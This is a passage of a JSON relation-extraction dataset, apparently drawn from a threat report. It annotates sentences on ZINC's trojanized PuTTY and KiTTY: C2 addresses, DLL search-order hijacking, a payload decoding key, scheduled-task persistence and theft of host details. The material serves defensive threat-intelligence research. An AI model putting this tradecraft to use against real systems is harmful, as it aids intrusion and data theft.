"."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [5, 5], "name": "recipient", "pos": [5, 6], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [9, 9], "name": "ReadMe.txt", "pos": [9, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "executable file", "pos": [12, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "ZINC", "pos": [6, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [41, 41], "name": "executable", "pos": [24, 25], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [46, 46], "name": "ZetaNile implant", "pos": [29, 31], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "ZetaNile", "pos": [1, 2], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [56, 56], "name": "SSH utility", "pos": [7, 9], "index": "7_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [64, 64], "name": "ReadMe.txt file", "pos": [15, 17], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [67, 67], "name": "Server : 137.184.15.189", "pos": [0, 3], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [72, 72], "name": "PUTTY.exe", "pos": [2, 3], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [78, 78], "name": "Event Horizon malware", "pos": [8, 11], "index": "11_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [82, 82], "name": "C : \\ProgramData\\colorui.dll", "pos": [12, 15], "index": "12_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [88, 88], "name": "C : \\Windows\\System32\\colorcpl.exe", "pos": [18, 21], "index": "13_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [92, 92], "name": "C : \\ProgramData\\colorcpl.exe", "pos": [22, 25], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [103, 103], "name": "ZINC", "pos": [7, 8], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [111, 111], "name": "colurui.dll", "pos": [15, 16], "index": "16_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [116, 116], "name": "payload", "pos": [20, 21], "index": "17_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [121, 121], "name": "0CE1241A44557AA438F27BC6D4ACA246", "pos": [25, 26], "index": "18_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [136, 136], "name": "C2 server", "pos": [5, 7], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [140, 140], "name": "attackers", "pos": [9, 10], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [144, 144], "name": "malware", "pos": [13, 14], "index": "21_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [167, 167], "name": "PackageColor", "pos": [14, 15], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [176, 176], "name": "weaponized PuTTY", "pos": [23, 25], "index": "23_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 8}, {"r": "RD", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 5}, {"r": "WR", "evidence": [1, 2], "t": 4, "h": 7}, {"r": "WR", "evidence": [1, 2], "t": 5, "h": 7}, {"r": "RD", "evidence": [2], "h": 7, "t": 8}, {"r": "ST", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "RF", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "ST", "evidence": [3, 4], "t": 9, "h": 10}, {"r": "RF", "evidence": [3, 4], "t": 9, "h": 10}, {"r": "RD", "evidence": [4], "h": 10, "t": 12}, {"r": "FR", "evidence": [4], "h": 10, "t": 11}, {"r": "WR", "evidence": [4], "h": 10, "t": 12}, {"r": "RD", "evidence": [4], "h": 10, "t": 14}, {"r": "RD", "evidence": [4], "h": 10, "t": 13}, {"r": "WR", "evidence": [4], "h": 10, "t": 14}, {"r": "WR", "evidence": [5], "h": 15, "t": 16}, {"r": "RD", "evidence": [5], "h": 15, "t": 17}, {"r": "RD", "evidence": [5], "h": 15, "t": 18}, {"r": "ST", "evidence": [6], "t": 19, "h": 20}, {"r": "RF", "evidence": [6], "t": 19, "h": 20}, {"r": "FR", "evidence": [6], "h": 20, "t": 21}, {"r": "FR", "evidence": [7], "t": 22, "h": 23}]}, {"title": "052-6", "sents": [["As", "part", "of", "the", "evolution", "of", "ZINC", "'", "s", "malware", "development", ",", "and", "in", "an", "effort", "to", "evade", "traditional", "defenses", ",", "running", "the", "included", "executable", "does", "not", "drop", "the", "ZetaNile", "implant", "."], ["For", "ZetaNile", "to", "be", "deployed", ",", "the", "SSH", "utility", "requires", "the", "IP", "provided", "in", "the", "ReadMe.txt", "file", "."], ["Server", ":", "137.184.15.189"], ["The", "malicious", "PUTTY.exe", "is", "configured", "to", "install", "the", "Event", "Horizon", "malware", "in", "C", ":", "\\ProgramData\\colorui.dll", "and", "subsequently", "copy", "C", ":", "\\Windows\\System32\\colorcpl.exe", "to", "C", ":", "\\ProgramData\\colorcpl.exe", "."], ["By", "using", "DLL", "search", "order", "hijacking", ",", "ZINC", "can", "load", "the", "second", "stage", "malware", ",", "colurui.dll", ",", "and", "decode", "the", "payload", "with", "the", "key", "``", "0CE1241A44557AA438F27BC6D4ACA246", "''", "to", "be", "used", "for", "command", "and", "control", "."], ["Upon", "successful", "connection", "to", "the", "C2", "server", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "compromised", "device", "for", "other", "tasks", "."], ["Lastly", ",", "persistence", "is", "established", "with", "the", "creation", "of", "a", "daily", "scheduled", "task", ",", "PackageColor", ",", "as", "part", "of", "the", "configuration", "for", "the", "weaponized", "PuTTY", "."], ["ZINC", "accomplishes", "this", "with", "the", "following", "command", ":"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "ZINC", "pos": [6, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [24, 24], "name": "executable", "pos": [24, 25], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [29, 29], "name": "ZetaNile implant", "pos": [29, 31], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [33, 33], "name": "ZetaNile", "pos": [1, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [39, 39], "name": "SSH utility", "pos": [7, 9], "index": "4_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [47, 47], "name": "ReadMe.txt file", "pos": [15, 17], "index": "5_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [50, 50], "name": "Server : 137.184.15.189", "pos": [0, 3], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [55, 55], "name": "PUTTY.exe", "pos": [2, 3], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [61, 61], "name": "Event Horizon malware", "pos": [8, 11], "index": "8_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [65, 65], "name": "C : \\ProgramData\\colorui.dll", "pos": [12, 15], "index": "9_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [71, 71], "name": "C : \\Windows\\System32\\colorcpl.exe", "pos": [18, 21], "index": "10_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [75, 75], "name": "C : \\ProgramData\\colorcpl.exe", "pos": [22, 25], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [86, 86], "name": "ZINC", "pos": [7, 8], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [94, 94], "name": "colurui.dll", "pos": [15, 16], "index": "13_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [99, 99], "name": "payload", "pos": [20, 21], "index": "14_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [104, 104], "name": "0CE1241A44557AA438F27BC6D4ACA246", "pos": [25, 26], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [119, 119], "name": "C2 server", "pos": [5, 7], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [123, 123], "name": "attackers", "pos": [9, 10], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [127, 127], "name": "malware", "pos": [13, 14], "index": "18_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [150, 150], "name": "PackageColor", "pos": [14, 15], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [159, 159], "name": "weaponized PuTTY", "pos": [23, 25], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [162, 162], "name": "ZINC", "pos": [0, 1], "index": "21_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 4}, {"r": "WR", "evidence": [0, 1], "t": 2, "h": 4}, {"r": "RD", "evidence": [1], "h": 4, "t": 5}, {"r": "ST", "evidence": [1, 2], "h": 4, "t": 6}, {"r": "RF", "evidence": [1, 2], "h": 4, "t": 6}, {"r": "ST", "evidence": [2, 3], "t": 6, "h": 7}, {"r": "RF", "evidence": [2, 3], "t": 6, "h": 7}, {"r": "RD", "evidence": [3], "h": 7, "t": 9}, {"r": "FR", "evidence": [3], "h": 7, "t": 8}, {"r": "WR", "evidence": [3], "h": 7, "t": 9}, {"r": "RD", "evidence": [3], "h": 7, "t": 11}, {"r": "RD", "evidence": [3], "h": 7, "t": 10}, {"r": "WR", "evidence": [3], "h": 7, "t": 11}, {"r": "WR", "evidence": [4], "h": 12, "t": 13}, {"r": "RD", "evidence": [4], "h": 12, "t": 14}, {"r": "RD", "evidence": [4], "h": 12, "t": 15}, {"r": "ST", "evidence": [5], "t": 16, "h": 17}, {"r": "RF", "evidence": [5], "t": 16, "h": 17}, {"r": "FR", "evidence": [5], "h": 17, "t": 18}, {"r": "FR", "evidence": [6], "t": 19, "h": 20}, {"r": "FR", "evidence": [6, 7], "h": 19, "t": 21}]}, {"title": "052-7", "sents": [["For", "ZetaNile", "to", "be", "deployed", ",", "the", "SSH", "utility", "requires", "the", "IP", "provided", "in", "the", "ReadMe.txt", "file", "."], ["Server", ":", "137.184.15.189"], ["The", "malicious", "PUTTY.exe", "is", "configured", "to", "install", "the", "Event", "Horizon", "malware", "in", "C", ":", "\\ProgramData\\colorui.dll", "and", "subsequently", "copy", "C", ":", "\\Windows\\System32\\colorcpl.exe", "to", "C", ":", "\\ProgramData\\colorcpl.exe", "."], ["By", "using", "DLL", "search", "order", "hijacking", ",", "ZINC", "can", "load", "the", "second", "stage", "malware", ",", "colurui.dll", ",", "and", "decode", "the", "payload", "with", "the", "key", "``", "0CE1241A44557AA438F27BC6D4ACA246", "''", "to", "be", "used", "for", "command", "and", "control", "."], ["Upon", "successful", "connection", "to", "the", "C2", "server", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "compromised", "device", "for", "other", "tasks", "."], ["Lastly", ",", "persistence", "is", "established", "with", "the", "creation", "of", "a", "daily", "scheduled", "task", ",", "PackageColor", ",", "as", "part", "of", "the", "configuration", "for", "the", "weaponized", "PuTTY", "."], ["ZINC", "accomplishes", "this", "with", "the", "following", "command", ":"], ["PuTTY", "scheduled", "task", "as", "part", "of", "persistence"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "ZetaNile", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "SSH utility", "pos": [7, 9], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [15, 15], "name": "ReadMe.txt file", "pos": [15, 17], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [18, 18], "name": "Server : 137.184.15.189", "pos": [0, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [23, 23], "name": "PUTTY.exe", "pos": [2, 3], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [29, 29], "name": "Event Horizon malware", "pos": [8, 11], "index": "5_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [33, 33], "name": "C : \\ProgramData\\colorui.dll", "pos": [12, 15], "index": "6_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [39, 39], "name": "C : \\Windows\\System32\\colorcpl.exe", "pos": [18, 21], "index": "7_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [43, 43], "name": "C : \\ProgramData\\colorcpl.exe", "pos": [22, 25], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [54, 54], "name": "ZINC", "pos": [7, 8], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [62, 62], "name": "colurui.dll", "pos": [15, 16], "index": "10_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [67, 67], "name": "payload", "pos": [20, 21], "index": "11_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [72, 72], "name": "0CE1241A44557AA438F27BC6D4ACA246", "pos": [25, 26], "index": "12_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [87, 87], "name": "C2 server", "pos": [5, 7], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [91, 91], "name": "attackers", "pos": [9, 10], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [95, 95], "name": "malware", "pos": [13, 14], "index": "15_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [118, 118], "name": "PackageColor", "pos": [14, 15], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [127, 127], "name": "weaponized PuTTY", "pos": [23, 25], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [130, 130], "name": "ZINC", "pos": [0, 1], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [138, 138], "name": "PuTTY", "pos": [0, 1], "index": "19_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 1, "t": 2}, {"r": "ST", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "RF", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "ST", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "RF", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "RD", "evidence": [2], "h": 4, "t": 6}, {"r": "FR", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2], "h": 4, "t": 6}, {"r": "RD", "evidence": [2], "h": 4, "t": 8}, {"r": "RD", "evidence": [2], "h": 4, "t": 7}, {"r": "WR", "evidence": [2], "h": 4, "t": 8}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "RD", "evidence": [3], "h": 9, "t": 11}, {"r": "RD", "evidence": [3], "h": 9, "t": 12}, {"r": "ST", "evidence": [4], "t": 13, "h": 14}, {"r": "RF", "evidence": [4], "t": 13, "h": 14}, {"r": "FR", "evidence": [4], "h": 14, "t": 15}, {"r": "FR", "evidence": [5], "t": 16, "h": 17}, {"r": "FR", "evidence": [5, 6], "h": 16, "t": 18}, {"r": "CO", "evidence": [5, 6, 7], "t": 17, "h": 19}]}, {"title": "052-8", "sents": [["Server", ":", "137.184.15.189"], ["The", "malicious", "PUTTY.exe", "is", "configured", "to", "install", "the", "Event", "Horizon", "malware", "in", "C", ":", "\\ProgramData\\colorui.dll", "and", "subsequently", "copy", "C", ":", "\\Windows\\System32\\colorcpl.exe", "to", "C", ":", "\\ProgramData\\colorcpl.exe", "."], ["By", "using", "DLL", "search", "order", "hijacking", ",", "ZINC", "can", "load", "the", "second", "stage", "malware", ",", "colurui.dll", ",", "and", "decode", "the", "payload", "with", "the", "key", "``", "0CE1241A44557AA438F27BC6D4ACA246", "''", "to", "be", "used", "for", "command", "and", "control", "."], ["Upon", "successful", "connection", "to", "the", "C2", "server", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "compromised", "device", "for", "other", "tasks", "."], ["Lastly", ",", "persistence", "is", "established", "with", "the", "creation", "of", "a", "daily", "scheduled", "task", ",", "PackageColor", ",", "as", "part", "of", "the", "configuration", "for", "the", "weaponized", "PuTTY", "."], ["ZINC", "accomplishes", "this", "with", "the", "following", "command", ":"], ["PuTTY", "scheduled", "task", "as", "part", "of", "persistence"], ["The", "executable", "first", "collects", "the", "username", "and", "hostname", "of", "the", "victim", "system", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [0, 0], "name": "Server : 137.184.15.189", "pos": [0, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [5, 5], "name": "PUTTY.exe", "pos": [2, 3], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [11, 11], "name": "Event Horizon malware", "pos": [8, 11], "index": "2_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [15, 15], "name": "C : \\ProgramData\\colorui.dll", "pos": [12, 15], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [21, 21], "name": "C : \\Windows\\System32\\colorcpl.exe", "pos": [18, 21], "index": "4_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [25, 25], "name": "C : \\ProgramData\\colorcpl.exe", "pos": [22, 25], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [36, 36], "name": "ZINC", "pos": [7, 8], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [44, 44], "name": "colurui.dll", "pos": [15, 16], "index": "7_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [49, 49], "name": "payload", "pos": [20, 21], "index": "8_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [54, 54], "name": "0CE1241A44557AA438F27BC6D4ACA246", "pos": [25, 26], "index": "9_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [69, 69], "name": "C2 server", "pos": [5, 7], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [73, 73], "name": "attackers", "pos": [9, 10], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [77, 77], "name": "malware", "pos": [13, 14], "index": "12_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [100, 100], "name": "PackageColor", "pos": [14, 15], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [109, 109], "name": "weaponized PuTTY", "pos": [23, 25], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [112, 112], "name": "ZINC", "pos": [0, 1], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [120, 120], "name": "PuTTY", "pos": [0, 1], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [128, 128], "name": "executable", "pos": [1, 2], "index": "17_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [132, 132], "name": "username", "pos": [5, 6], "index": "18_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [134, 134], "name": "hostname", "pos": [7, 8], "index": "19_0"}]], "labels": [{"r": "ST", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "RF", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "RD", "evidence": [1], "h": 1, "t": 3}, {"r": "FR", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 1, "t": 3}, {"r": "RD", "evidence": [1], "h": 1, "t": 5}, {"r": "RD", "evidence": [1], "h": 1, "t": 4}, {"r": "WR", "evidence": [1], "h": 1, "t": 5}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "RD", "evidence": [2], "h": 6, "t": 8}, {"r": "RD", "evidence": [2], "h": 6, "t": 9}, {"r": "ST", "evidence": [3], "t": 10, "h": 11}, {"r": "RF", "evidence": [3], "t": 10, "h": 11}, {"r": "FR", "evidence": [3], "h": 11, "t": 12}, {"r": "FR", "evidence": [4], "t": 13, "h": 14}, {"r": "FR", "evidence": [4, 5], "h": 13, "t": 15}, {"r": "CO", "evidence": [4, 5, 6], "t": 14, "h": 16}, {"r": "RD", "evidence": [7], "h": 17, "t": 18}, {"r": "RD", "evidence": [7], "h": 17, "t": 19}]}, {"title": "052-9", "sents": [["The", "malicious", "PUTTY.exe", "is", "configured", "to", "install", "the", "Event", "Horizon", "malware", "in", "C", ":", "\\ProgramData\\colorui.dll", "and", "subsequently", "copy", "C", ":", "\\Windows\\System32\\colorcpl.exe", "to", "C", ":", "\\ProgramData\\colorcpl.exe", "."], ["By", "using", "DLL", "search", "order", "hijacking", ",", "ZINC", "can", "load", "the", "second", "stage", "malware", ",", "colurui.dll", ",", "and", "decode", "the", "payload", "with", "the", "key", "``", "0CE1241A44557AA438F27BC6D4ACA246", "''", "to", "be", "used", "for", "command", "and", "control", "."], ["Upon", "successful", "connection", "to", "the", "C2", "server", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "compromised", "device", "for", "other", "tasks", "."], ["Lastly", ",", "persistence", "is", "established", "with", "the", "creation", "of", "a", "daily", "scheduled", "task", ",", "PackageColor", ",", "as", "part", "of", "the", "configuration", "for", "the", "weaponized", "PuTTY", "."], ["ZINC", "accomplishes", "this", "with", "the", "following", "command", ":"], ["PuTTY", "scheduled", "task", "as", "part", "of", "persistence"], ["The", "executable", "first", "collects", "the", "username", "and", "hostname", "of", "the", "victim", "system", "."], ["It", "then", "sends", "that", "information", "to", "a", "hardcoded", "IP", "172.93.201.253", "over", "TCP/22", ",", "which", "does", "not", "use", "SSH", "protocol", "and", "does", "not", "require", "SSH", "handshake", "to", "establish", "communication", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "PUTTY.exe", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "Event Horizon malware", "pos": [8, 11], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [12, 12], "name": "C : \\ProgramData\\colorui.dll", "pos": [12, 15], "index": "2_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [18, 18], "name": "C : \\Windows\\System32\\colorcpl.exe", "pos": [18, 21], "index": "3_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [22, 22], "name": "C : \\ProgramData\\colorcpl.exe", "pos": [22, 25], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [33, 33], "name": "ZINC", "pos": [7, 8], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [41, 41], "name": "colurui.dll", "pos": [15, 16], "index": "6_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [46, 46], "name": "payload", "pos": [20, 21], "index": "7_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [51, 51], "name": "0CE1241A44557AA438F27BC6D4ACA246", "pos": [25, 26], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [66, 66], "name": "C2 server", "pos": [5, 7], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [70, 70], "name": "attackers", "pos": [9, 10], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [74, 74], "name": "malware", "pos": [13, 14], "index": "11_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [97, 97], "name": "PackageColor", "pos": [14, 15], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [106, 106], "name": "weaponized PuTTY", "pos": [23, 25], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [109, 109], "name": "ZINC", "pos": [0, 1], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [117, 117], "name": "PuTTY", "pos": [0, 1], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [125, 125], "name": "executable", "pos": [1, 2], "index": "16_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [129, 129], "name": "username", "pos": [5, 6], "index": "17_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [131, 131], "name": "hostname", "pos": [7, 8], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [137, 137], "name": "It", "pos": [0, 1], "index": "19_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [146, 146], "name": "172.93.201.253", "pos": [9, 10], "index": "20_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0], "h": 0, "t": 4}, {"r": "RD", "evidence": [0], "h": 0, "t": 3}, {"r": "WR", "evidence": [0], "h": 0, "t": 4}, {"r": "WR", "evidence": [1], "h": 5, "t": 6}, {"r": "RD", "evidence": [1], "h": 5, "t": 7}, {"r": "RD", "evidence": [1], "h": 5, "t": 8}, {"r": "ST", "evidence": [2], "t": 9, "h": 10}, {"r": "RF", "evidence": [2], "t": 9, "h": 10}, {"r": "FR", "evidence": [2], "h": 10, "t": 11}, {"r": "FR", "evidence": [3], "t": 12, "h": 13}, {"r": "FR", "evidence": [3, 4], "h": 12, "t": 14}, {"r": "ST", "evidence": [4, 5, 6, 7], "h": 14, "t": 20}, {"r": "RF", "evidence": [4, 5, 6, 7], "h": 14, "t": 20}, {"r": "ST", "evidence": [5, 6, 7], "h": 15, "t": 20}, {"r": "RF", "evidence": [5, 6, 7], "h": 15, "t": 20}, {"r": "CO", "evidence": [3, 4, 5], "t": 13, "h": 15}, {"r": "RD", "evidence": [6], "h": 16, "t": 17}, {"r": "RD", "evidence": [6], "h": 16, "t": 18}, {"r": "CO", "evidence": [6, 7], "h": 16, "t": 19}, {"r": "ST", "evidence": [7], "h": 19, "t": 20}]}, {"title": "052-10", "sents": [["By", "using", "DLL", "search", "order", "hijacking", ",", "ZINC", "can", "load", "the", "second", "stage", "malware", ",", "colurui.dll", ",", "and", "decode", "the", "payload", "with", "the", "key", "``", "0CE1241A44557AA438F27BC6D4ACA246", "''", "to", "be", "used", "for", "command", "and", "control", "."], ["Upon", "successful", "connection", "to", "the", "C2", "server", ",", "the", "attackers", "can", "install", "additional", "malware", "on", "the", "compromised", "device", "for", "other", "tasks", "."], ["Lastly", ",", "persistence", "is", "established", "with", "the", "creation", "of", "a", "daily", "scheduled", "task", ",", "PackageColor", ",", "as", "part", "of", "the", "configuration", "for", "the", "weaponized", "PuTTY", "."], ["ZINC", "accomplishes", "this", "with", "the", "following", "command", ":"], ["PuTTY", "scheduled", "task", "as", "part", "of", "persistence"], ["The", "executable", "first", "collects", "the", "username", "and", "hostname", "of", "the", "victim", "system", "."], ["It", "then", "sends", "that", "information", "to", "a", "hardcoded", "IP", "172.93.201.253", "over", "TCP/22", ",", "which", "does", "not", "use", "SSH", "protocol", "and", "does", "not", "require", "SSH", "handshake", "to", "establish", "communication", "."], ["Upon", "successful", "TCP", "connection", "to", "the", "server", "at", "137.184.15.189", ",", "the", "malicious", "KiTTY", "executable", "then", "deploys", "the", "malware", "as", "%", "AppData", "%", "\\mscoree.dll", "following", "multiple", "rounds", "of", "decoding", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "ZINC", "pos": [7, 8], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "colurui.dll", "pos": [15, 16], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [20, 20], "name": "payload", "pos": [20, 21], "index": "2_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [25, 25], "name": "0CE1241A44557AA438F27BC6D4ACA246", "pos": [25, 26], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [40, 40], "name": "C2 server", "pos": [5, 7], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [44, 44], "name": "attackers", "pos": [9, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [48, 48], "name": "malware", "pos": [13, 14], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [71, 71], "name": "PackageColor", "pos": [14, 15], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [80, 80], "name": "weaponized PuTTY", "pos": [23, 25], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [83, 83], "name": "ZINC", "pos": [0, 1], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [91, 91], "name": "PuTTY", "pos": [0, 1], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [99, 99], "name": "executable", "pos": [1, 2], "index": "11_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [103, 103], "name": "username", "pos": [5, 6], "index": "12_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [105, 105], "name": "hostname", "pos": [7, 8], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [111, 111], "name": "It", "pos": [0, 1], "index": "14_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [120, 120], "name": "172.93.201.253", "pos": [9, 10], "index": "15_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [148, 148], "name": "137.184.15.189", "pos": [8, 9], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [152, 152], "name": "KiTTY executable", "pos": [12, 14], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [159, 159], "name": "% AppData % \\mscoree.dll", "pos": [19, 23], "index": "18_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0], "h": 0, "t": 3}, {"r": "ST", "evidence": [1], "t": 4, "h": 5}, {"r": "RF", "evidence": [1], "t": 4, "h": 5}, {"r": "FR", "evidence": [1], "h": 5, "t": 6}, {"r": "FR", "evidence": [2], "t": 7, "h": 8}, {"r": "FR", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "ST", "evidence": [3, 4, 